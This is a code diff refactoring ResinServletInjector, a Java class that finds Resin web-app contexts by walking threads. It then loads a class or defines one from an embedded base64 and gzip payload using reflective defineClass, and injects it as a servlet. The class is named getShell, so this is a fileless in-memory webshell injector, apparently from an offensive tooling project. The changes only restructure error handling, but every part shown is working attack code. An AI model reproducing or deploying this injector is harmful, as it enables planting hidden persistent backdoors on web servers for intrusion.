@@ -46,18 +46,12 @@ public class ResinServletInjector {
         Set<Object> contexts = new HashSet<Object>();
         Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
         for (Thread thread : threads) {
-            Class<?> servletInvocationClass = null;
             try {
-                servletInvocationClass = thread.getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
-            } catch (Exception e) {
-                continue;
-            }
-            if (servletInvocationClass != null) {
+                Class<?> servletInvocationClass = thread.getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                 Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
                 Object webApp = invokeMethod(contextRequest, "getWebApp", new Class[0], new Object[0]);
-                if (webApp != null) {
-                    contexts.add(webApp);
-                }
+                contexts.add(webApp);
+            } catch (Exception ignored) {
             }
         }
         return Arrays.asList(contexts.toArray());
@@ -65,21 +59,19 @@ public class ResinServletInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     private void inject(Object context, Object servlet) throws Exception {
@@ -129,7 +121,6 @@ public class ResinServletInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -137,16 +128,13 @@ public class ResinServletInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
